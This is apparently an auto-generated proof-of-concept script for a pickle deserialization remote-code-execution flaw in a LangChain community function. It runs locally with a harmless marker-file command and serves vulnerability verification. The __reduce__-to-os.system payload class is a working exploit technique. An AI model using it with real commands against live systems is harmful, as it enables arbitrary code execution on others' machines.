#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-020
# Sink: _send_pipeline_to_device
# Auto-generated — run with: python3 rce_who_control_pipeline__send_pipeline_to_device_3.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langchain-community-only RCE vulnerability.

Vulnerability: Unsafe deserialization via pickle.load() in _send_pipeline_to_device.
The function accepts a 'pipeline' parameter. If it's a string, it opens the file
and calls pickle.load() on it, which can execute arbitrary code.

Attack vector: An attacker who can control the 'pipeline' parameter (e.g., via a
web endpoint) can provide a path to a malicious pickle file, leading to RCE.

This PoC:
1. Creates a malicious pickle file that executes a benign command (touch /tmp/poc_success.txt)
2. Simulates calling the vulnerable function with the path to this file
3. Verifies the command was executed

Usage: python3 poc.py [target_url]
"""

import os
import sys
import pickle
import tempfile
import subprocess
import argparse

# Benign payload - creates a marker file to prove code execution
BENIGN_COMMAND = "touch /tmp/poc_success.txt"


class MaliciousPickle:
    """Class that executes a command when unpickled."""
    
    def __reduce__(self):
        """Return a tuple that pickle will use to reconstruct the object.
        This executes os.system() with our command."""
        return (os.system, (BENIGN_COMMAND,))


def create_malicious_pickle(filepath: str) -> None:
    """
    Create a malicious pickle file that executes a command when deserialized.
    
    Args:
        filepath: Path where the pickle file will be written
    """
    payload = MaliciousPickle()
    with open(filepath, "wb") as f:
        pickle.dump(payload, f)
    print(f"[+] Created malicious pickle file at: {filepath}")
    print(f"[+] Payload will execute: {BENIGN_COMMAND}")


def simulate_vulnerable_call(pickle_path: str) -> None:
    """
    Simulate the vulnerable _send_pipeline_to_device function call.
    
    This replicates the exact vulnerable code path:
    if isinstance(pipeline, str):
        with open(pipeline, "rb") as f:
            pipeline = pickle.load(f)
    
    Args:
        pickle_path: Path to the malicious pickle file
    """
    print(f"[*] Simulating vulnerable function call with pipeline='{pickle_path}'")
    
    # This is the exact vulnerable code from the library
    pipeline = pickle_path
    if isinstance(pipeline, str):
        with open(pipeline, "rb") as f:
            pipeline = pickle.load(f)  # RCE happens here
    
    print("[+] Deserialization completed (code executed during pickle.load)")


def verify_exploit() -> bool:
    """
    Verify that the exploit worked by checking if the marker file exists.
    
    Returns:
        True if the marker file was created (exploit successful)
    """
    marker_file = "/tmp/poc_success.txt"
    if os.path.exists(marker_file):
        print(f"[+] SUCCESS: Marker file '{marker_file}' exists!")
        print(f"[+] Command '{BENIGN_COMMAND}' was executed successfully.")
        # Clean up the marker file
        os.remove(marker_file)
        print(f"[+] Cleaned up marker file.")
        return True
    else:
        print(f"[-] FAILED: Marker file '{marker_file}' not found.")
        print(f"[-] The command may not have been executed.")
        return False


def main():
    """Main function to run the PoC exploit."""
    parser = argparse.ArgumentParser(
        description="PoC for langchain-community-only pickle deserialization RCE"
    )
    parser.add_argument(
        "target_url",
        nargs="?",
        default=None,
        help="Target URL (optional, for remote exploitation)"
    )
    args = parser.parse_args()
    
    print("=" * 60)
    print("langchain-community-only RCE Proof-of-Concept")
    print("=" * 60)
    print()
    
    # Create a temporary file for the malicious pickle
    with tempfile.NamedTemporaryFile(suffix=".pkl", delete=False) as tmp:
        pickle_path = tmp.name
    
    try:
        # Step 1: Create the malicious pickle file
        print("[*] Step 1: Creating malicious pickle file...")
        create_malicious_pickle(pickle_path)
        print()
        
        # Step 2: Simulate the vulnerable function call
        print("[*] Step 2: Triggering deserialization...")
        simulate_vulnerable_call(pickle_path)
        print()
        
        # Step 3: Verify the exploit worked
        print("[*] Step 3: Verifying exploit success...")
        success = verify_exploit()
        print()
        
        if success:
            print("[✓] Exploit completed successfully!")
            print(f"[✓] Demonstrated RCE via pickle.load() in _send_pipeline_to_device")
        else:
            print("[✗] Exploit failed - check the implementation")
            sys.exit(1)
            
    except Exception as e:
        print(f"[-] Error during exploit: {e}")
        sys.exit(1)
    finally:
        # Clean up the temporary pickle file
        if os.path.exists(pickle_path):
            os.remove(pickle_path)
            print(f"[+] Cleaned up temporary pickle file.")


if __name__ == "__main__":
    main()
